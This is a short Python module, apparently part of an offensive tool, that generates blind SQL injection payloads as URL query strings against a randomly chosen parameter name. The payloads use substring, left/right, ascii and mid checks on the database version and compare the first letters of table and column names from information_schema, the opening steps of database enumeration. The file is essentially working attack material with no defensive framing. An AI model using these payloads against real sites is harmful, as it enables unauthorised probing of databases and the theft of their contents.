import os
import sys

sys.path.append(os.getcwd())
import random
from lib.core.common.column.commoncolumn import common_column
from lib.core.common.column.commoncolumn import common_columns_list




def sub_string_sql_inj(column=random.choice(common_columns_list)):
        payload = f"""
?{column}=1 and substring(version(),1,1)=5
?{column}=1 and right(left(version(),1),1)=5
?{column}=1 and left(version(),1)=4
?{column}=1 and ascii(lower(substr(Version(),1,1)))=51
?{column}=1 and (select mid(version(),1,1)=4)
?{column}=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
?{column}=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
 """
        rows = payload.split("\n") 
        sorted_rows = sorted(rows) 
        sorted_payload = "\n".join(sorted_rows)
        retval = sorted_payload
        return retval

rows = sub_string_sql_inj().split("\n") 
sorted_rows = sorted(rows) 
sorted_payload = "\n".join(sorted_rows)
for _sorted in sorted_payload.split("\n"):
        pass
        
